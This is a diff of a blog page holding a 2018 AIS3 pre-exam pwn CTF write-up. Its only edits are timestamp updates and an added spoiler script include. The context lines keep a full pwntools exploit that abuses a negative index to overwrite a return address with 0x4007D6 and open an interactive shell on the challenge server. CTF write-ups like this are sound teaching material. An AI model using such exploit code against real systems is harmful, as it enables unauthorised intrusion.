@@ -28,7 +28,7 @@
 <meta property="og:description" content="This is 2018 AIS3 prexam pwn writeups.">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2018-08-01T21:11:44.000Z">
-<meta property="article:modified_time" content="2025-10-12T23:47:13.468Z">
+<meta property="article:modified_time" content="2025-10-14T04:09:42.792Z">
 <meta property="article:author" content="clooooode">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="AIS3">
@@ -254,7 +254,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-10-12 23:47:13" itemprop="dateModified" datetime="2025-10-12T23:47:13+00:00">2025-10-12</time>
+      <time title="Modified: 2025-10-14 04:09:42" itemprop="dateModified" datetime="2025-10-14T04:09:42+00:00">2025-10-14</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -349,7 +349,7 @@ I decrease would cause memory address move backward 16 byte. At least I
 have to backward 16 * 8(128 byte) to cover return address. But need more
 8 dummy character to fit into extra backward.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./darling&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;104.199.235.135&#x27;</span>, <span class="number">2112</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code: &#x27;</span>, <span class="string">&#x27;6666&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Are you sure ? (yes:1 / no:0) &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Are you sure ? (yes:1 / no:0) &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Code: &#x27;</span>, <span class="string">&#x27;16&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Are you sure ? (yes:1 / no:0) &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Which FRANXX do you wnat to use ? &#x27;</span>, <span class="string">&#x27;-8&#x27;</span>)</span><br><span class="line">p.sendlineafter(</span><br><span class="line">    <span class="string">&#x27;New name for this FRANXX: &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x00000000004007D6</span>)</span><br><span class="line">)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
     </div>
 
     
